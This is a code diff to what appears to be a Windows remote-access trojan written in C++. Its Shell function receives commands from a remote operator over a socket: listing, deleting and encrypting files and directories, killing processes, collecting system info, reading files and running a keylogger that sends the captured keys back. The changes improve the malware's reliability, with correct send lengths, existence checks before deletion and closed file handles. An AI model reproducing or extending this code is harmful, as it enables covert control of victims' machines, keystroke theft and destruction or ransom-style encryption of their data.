@@ -12,7 +12,6 @@
 #include <winsock2.h>
 #include <fstream>
 #include <string>
-//#include <iostream>
 
 #include "Autorun.h"
 #include "Config.h"
@@ -23,8 +22,9 @@
 #include "Keylogger.h"
 
 #pragma warning(disable: 4996)
+#pragma optimize("gsy", on)
 
-std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars;
+std::string buf, rbuf, key_ret, keydel, rkeydel, buf_file, loc_buf_file, keylog_path, chars, finally_msg, n_path;
 
 int Shell(SOCKADDR_IN addr);
 
@@ -72,11 +72,11 @@ int Shell(SOCKADDR_IN addr) {
 		buf_file = "";
 		loc_buf_file = "";
 		memset(&buffer, 0x0, sizeof(buffer));
+
 		recv(conn, buffer, sizeof(buffer), NULL);
+		memset(&path, 0x0, sizeof(path));
 
 		if (strcmp(buffer, "ls") == 0) {
-			char path[1024];
-			memset(&path, 0x0, sizeof(path));
 			recv(conn, path, sizeof(path), NULL);
 			std::string comm = "dir " + std::string(path) + " > file.txt";
 			system(comm.c_str());
@@ -86,29 +86,43 @@ int Shell(SOCKADDR_IN addr) {
 			while (getline(F, loc_buf_file)) {
 				buf_file += loc_buf_file + '\n';
 			}
+			F.close();
 			system("del file.txt");
-			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
-
+			send(conn, buf_file.c_str(), buf_file.length(), NULL);
 		}
 
 		else if (strcmp(buffer, "rm") == 0) {
-			memset(&path, 0x0, sizeof(path));
 			recv(conn, path, sizeof(path), NULL);
-			std::string comm = "del " + std::string(path);
-			system(comm.c_str());
-			std::string finally_msg = "delete " + std::string(path) + " ok";
-			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);
 
+			n_path = path;
+			TreatmentPath(n_path);
+			if (n_path[n_path.size() - 1] == '\\') n_path.pop_back();
+
+			if (FilExist(n_path)) {
+				std::string comm = "del " + std::string(n_path);
+				system(comm.c_str());
+				finally_msg = "delete " + std::string(n_path) + " ok";
+				if (FilExist(n_path))
+					finally_msg = "delete " + std::string(n_path) + " failed\nfile protected";
+			} else finally_msg = "delete " + std::string(n_path) + " failed";
+			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
 		}
 
 		else if (strcmp(buffer, "rmdir") == 0) {
-			memset(&path, 0x0, sizeof(path));
 			recv(conn, path, sizeof(path), NULL);
-			std::string comm = "RMDIR /S /Q " + std::string(path);
-			system(comm.c_str());
-			std::string finally_msg = "delete " + std::string(path) + " ok";
-			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);
 
+			n_path = path;
+			TreatmentPath(n_path);
+
+			if (dirExists(n_path)) {
+				std::string comm = "RMDIR /S /Q " + std::string(n_path);
+				system(comm.c_str());
+				finally_msg = "delete " + std::string(path) + " ok";
+				if (dirExists(n_path))
+					finally_msg = "delete " + std::string(n_path) + " failed\ndirectory protected";
+			} else finally_msg = "delete " + std::string(n_path) + " failed";
+			
+			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
 		}
 
 		else if (strcmp(buffer, "pwd") == 0) {
@@ -120,12 +134,13 @@ int Shell(SOCKADDR_IN addr) {
 				buf_file += loc_buf_file + '\n';
 			}
 			system("del file.txt");
-			send(conn, buf_file.c_str(), sizeof(buf_file) * 100, NULL);
+			send(conn, buf_file.c_str(), buf_file.length(), NULL);
+			F.close();
 		}
 
 		else if (strcmp(buffer, "info") == 0) {
 			std::string info = GetAllInfo();
-			send(conn, info.c_str(), sizeof(buf_file) * 100, NULL);
+			send(conn, info.c_str(), info.length(), NULL);
 		}
 
 		else if (strcmp(buffer, "ps") == 0) {
@@ -136,16 +151,16 @@ int Shell(SOCKADDR_IN addr) {
 				buf_file += loc_buf_file + '\n';
 			}
 			system("del file.txt");
-			send(conn, buf_file.c_str(), sizeof(buf_file) * 220, NULL);
+			send(conn, buf_file.c_str(), buf_file.length(), NULL);
+			F.close();
 		}
 
 		else if (strcmp(buffer, "kill") == 0) {
-			memset(&path, 0x0, sizeof(path));
 			recv(conn, path, sizeof(path), NULL);
 			std::string com = "taskkill /T /F /IM " + std::string(path);
 			system(com.c_str());
 			std::string finally_msg = "terminate " + std::string(path) + " ok";
-			send(conn, finally_msg.c_str(), sizeof(finally_msg) * 10, NULL);
+			send(conn, finally_msg.c_str(), finally_msg.length(), NULL);
 
 		}
 
@@ -154,13 +169,11 @@ int Shell(SOCKADDR_IN addr) {
 		}
 
 		else if (!strcmp(buffer, "error")) {
-			memset(&path, 0x0, sizeof(path));
 			recv(conn, path, sizeof(path), NULL);
 			MessageBoxA(NULL, path, "error 0x648396234", MB_ICONERROR | MB_OK | MB_SETFOREGROUND);
 		}
 
 		else if (!strcmp(buffer, "keylogger")) {
-			memset(&path, 0x0, sizeof(path));
 			keylog_path = getenv("LOCALAPPDATA") + std::string("\\");
 			recv(conn, path, sizeof(path), NULL);
 			while (buf.length() < unsigned int(atoi(path) + 7) && rbuf.length() < unsigned int(atoi(path) + 7)) {
@@ -173,7 +186,7 @@ int Shell(SOCKADDR_IN addr) {
 			rkeydel = "del " + keylog_path + "keylogru.txt";
 			system(keydel.c_str());
 			system(rkeydel.c_str());
-			send(conn, key_ret.c_str(), sizeof(key_ret) * 100, NULL);
+			send(conn, key_ret.c_str(), key_ret.length(), NULL);
 
 			memset(&buf, 0x0, sizeof(buf));
 			memset(&rbuf, 0x0, sizeof(rbuf));
@@ -181,7 +194,6 @@ int Shell(SOCKADDR_IN addr) {
 
 		else if (!strcmp(buffer, "cryptfile")) {
 			char key[128];
-			memset(&path, 0x0, sizeof(path));
 			memset(&key, 0x0, sizeof(key));
 			recv(conn, path, sizeof(path), NULL);
 			recv(conn, key, sizeof(key), NULL);
@@ -191,7 +203,6 @@ int Shell(SOCKADDR_IN addr) {
 
 		else if (!strcmp(buffer, "cryptdir")) {
 			char key[128];
-			memset(&path, 0x0, sizeof(path));
 			memset(&key, 0x0, sizeof(key));
 			recv(conn, path, sizeof(path), NULL);
 			recv(conn, key, sizeof(key), NULL);
@@ -207,6 +218,7 @@ int Shell(SOCKADDR_IN addr) {
 			else {
 				std::string file_data = readFile(path);
 				send(conn, file_data.c_str(), file_data.length(), NULL);
+				d_file.close();
 			}
 		}
 
